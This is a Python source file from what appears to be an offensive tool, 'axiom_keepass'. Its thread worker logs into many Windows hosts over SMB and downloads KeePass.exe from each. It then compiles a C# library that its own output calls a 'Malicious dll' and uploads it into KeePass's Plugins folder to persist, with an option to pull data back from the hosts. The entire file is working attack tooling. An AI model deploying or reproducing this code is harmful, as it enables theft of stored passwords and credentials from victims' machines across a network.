#!/usr/bin/python3

import os
import time
import tempfile
import threading
import subprocess

from axiom_keepass.core.parse_args import AxiomArgParser
from axiom_keepass.client.login import login
from axiom_keepass.client.download import download
from axiom_keepass.client.upload import upload
from axiom_keepass.client.pull import pull

class ThreadWorker(threading.Thread):
    def __init__(self, args, thread_index, thread_count, target_list, target_count):
        super(ThreadWorker, self).__init__()
        print(f"[THREAD {thread_index}] Thread spawned")
        self.args = args
        self.thread_index = thread_index
        self.thread_count = thread_count
        self.target_list = target_list
        self.target_count = target_count

    def run(self):
        bad_targets = []
        tmp_dir = tempfile.TemporaryDirectory().name
        os.mkdir(tmp_dir)
        print(f"[THREAD {self.thread_index}][*] Using tmp dir {tmp_dir}")

        while True:
            current_index = self.thread_index
            while True:
                if current_index >= self.target_count:
                    break

                print(f"[THREAD {self.thread_index}][*] Processing target {self.target_list[current_index]}")
                try:
                    smbClient = login(self.args, self.target_list[current_index])
                except Exception as e:
                    print(f"[THREAD {self.thread_index}][!] {self.target_list[current_index]}: {str(e)}, adding to bad targets...")
                    bad_targets.append(self.target_list[current_index])
                    current_index += self.thread_count
                    continue
                print(f"[THREAD {self.thread_index}][+] Successful login to {self.target_list[current_index]}")

                if AxiomArgParser.GetProgramArgs().pull == True or AxiomArgParser.GetProgramArgs().monitor == True: # type: ignore
                    print(f"[THREAD {self.thread_index}][*] Pulling from {self.target_list[current_index]}")
                    pull(smbClient, self.thread_index)
                    current_index += self.thread_count
                    continue

                err = download(
                    smbClient,
                    self.thread_index,
                    r"\Program Files\KeePass Password Safe 2\KeePass.exe",
                    f"{tmp_dir}/KeePass.exe",
                    silent=True
                )
                if err is None:
                    print(f"[THREAD {self.thread_index}][+] Downloaded KeePass.exe from {self.target_list[current_index]}")
                else:
                    print(f"[THREAD {self.thread_index}][!] Failed to download KeePass from {self.target_list[current_index]}, is KeePass installed ?")

                subprocess.run([
                    "mcs",
                    "-platform:x64",
                    f"-out:{tmp_dir}/AxiomKeepass.dll",
                    f"-r:{tmp_dir}/KeePass.exe",
                    f"-r:{os.path.dirname(__file__)}/../../Binaries/System.Windows.Forms.dll",
                    "-target:library",
                    f"{os.path.dirname(__file__)}/../../Assembly/AxiomKeepass.cs",
                    f"{os.path.dirname(__file__)}/../../Assembly/AssemblyInfo.cs"
                ])
                print(f"[THREAD {self.thread_index}][+] Malicious dll compiled for {self.target_list[current_index]}")

                upload(
                    smbClient,
                    self.thread_index,
                    r"\Program Files\KeePass Password Safe 2\Plugins\AxiomKeepass.dll",
                    f"{tmp_dir}/AxiomKeepass.dll",
                )

                smbClient.close()
                current_index += self.thread_count
            print(f"[THREAD {self.thread_index}][+] All targets processed")
            if AxiomArgParser.GetProgramArgs().monitor != True: # type: ignore
                break
            time.sleep(AxiomArgParser().GetProgramArgs().monitor_delay) #type: ignore

